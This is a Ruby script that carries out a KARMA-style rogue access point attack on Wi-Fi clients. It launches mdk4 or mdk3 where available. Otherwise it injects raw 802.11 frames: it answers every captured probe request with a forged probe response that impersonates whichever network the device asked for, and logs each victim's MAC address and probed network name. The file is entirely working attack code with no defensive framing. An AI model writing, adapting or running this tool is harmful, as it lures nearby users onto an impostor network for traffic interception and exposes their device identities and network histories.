#!/usr/bin/env ruby
# frozen_string_literal: true

require 'json'
require 'time'
require 'open3'
require 'socket'

def emit(event, iface, bssid, ssid, channel, data)
  puts JSON.generate(event: event, iface: iface, bssid: bssid, ssid: ssid, channel: channel, data: data, timestamp: Time.now.iso8601)
  $stdout.flush
end

ETH_P_ALL = [0x0003].pack('n').unpack1('S')

def if_nametoindex(name)
  Socket.getifaddrs.select { |a| a.name == name }.first&.ifindex
end

def build_probe_response(bssid, client_mac, ssid, channel)
  fc = [0x50, 0x00].pack('C*')
  dur = [0x013a].pack('v')
  addr1 = client_mac
  addr2 = bssid
  addr3 = bssid
  frag_seq = [rand(0..15) << 12 | rand(0..4095)].pack('v')

  frame_body = +''
  frame_body << [0].pack('C') + [ssid.bytesize].pack('C') + ssid
  frame_body << [1].pack('C') + [8].pack('C') + [0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24].pack('C*')
  frame_body << [3].pack('C') + [1].pack('C') + [channel].pack('C')
  frame_body << [5].pack('C') + [4].pack('C') + [0x00, 0x01, 0x00, 0x00].pack('C*')

  fc + dur + addr1 + addr2 + addr3 + frag_seq + frame_body
end

def run_mdk4_karma(iface)
  mdk4 = `which mdk4 2>/dev/null || which mdk3 2>/dev/null`.strip
  return nil if mdk4.empty?
  [mdk4, iface, 'b', '-t', '-a']
end

begin
  iface = ARGV[0]
  channel = (ARGV[1] || '6').to_i

  raise 'interface required' unless iface
  ifidx = if_nametoindex(iface)
  raise "interface #{iface} not found" unless ifidx

  emit('karma_start', iface, '', '', channel, {})
  mdk_cmd = run_mdk4_karma(iface)

  if mdk_cmd
    emit('karma_mdk4', iface, '', '', channel, { command: mdk_cmd.join(' ') })
    Open3.popen3(*mdk_cmd) do |stdin, stdout, stderr, thread|
      stdin.close
      [stdout, stderr].each do |r|
        Thread.new do
          r.each_line do |line|
            line.force_encoding('UTF-8')
            emit('karma_mdk4_output', iface, '', '', channel, { line: line.strip })
          end
        end
      end
      thread.join
    end
  else
    emit('karma_manual', iface, '', '', channel, { message: 'using manual frame injection' })

    sock = Socket.new(Socket::PF_PACKET, Socket::SOCK_RAW, ETH_P_ALL)
    bssid = format('%02x:%02x:%02x:%02x:%02x:%02x', rand(256), rand(256), rand(256), rand(256), rand(256), rand(256))
    bssid_bin = bssid.split(':').map { |b| b.to_i(16).chr }.join

    sock.bind(Socket.pack_sockaddr_ll(ETH_P_ALL, ifidx, 0, 0, 0, ''))

    emit('karma_bssid', iface, bssid, '', channel, {})

    loop do
      raw = sock.recvfrom(4096)[0]
      rt_len = raw[2..3].unpack1('v') rescue 0
      next if rt_len < 4 || rt_len >= raw.size
      frame = raw[rt_len..]
      next if frame.nil? || frame.size < 24

      fc = frame[0..1].unpack1('v')
      frame_type = (fc >> 2) & 0x3
      frame_subtype = (fc >> 4) & 0xF

      # probe request or directed probe
      next unless frame_type == 0 && (frame_subtype == 4 || frame_subtype == 7)

      client_mac = frame[10..15]
      probe_bssid = frame[16..21]
      next if probe_bssid != "\x00\x00\x00\x00\x00\x00" && probe_bssid != bssid_bin

      pos = 24
      ssid = nil
      while pos < frame.size - 2
        tag = frame[pos].ord
        len = frame[pos + 1].ord
        break if pos + 2 + len > frame.size
        if tag == 0 && len > 0
          ssid = frame[pos + 2, len]
        end
        pos += 2 + len
      end

      next unless ssid

      resp = build_probe_response(bssid_bin, client_mac, ssid, channel)
      addr = Socket.pack_sockaddr_ll(ETH_P_ALL, ifidx, 0, 0, 0, '')
      sock.send(resp, 0, addr)

      emit('karma_response', iface, bssid, ssid, channel, {
        client: client_mac.unpack('H2H2H2H2H2H2').map { |b| b.upcase }.join(':'),
        ssid_probed: ssid
      })
    end
  end

  emit('karma_complete', iface, '', '', channel, {})

rescue Interrupt
  emit('karma_interrupted', iface || '', '', '', channel || 0, {})
rescue => e
  $stderr.puts JSON.generate(event: 'error', data: { message: e.message, backtrace: e.backtrace&.first }, timestamp: Time.now.iso8601)
  exit 1
end
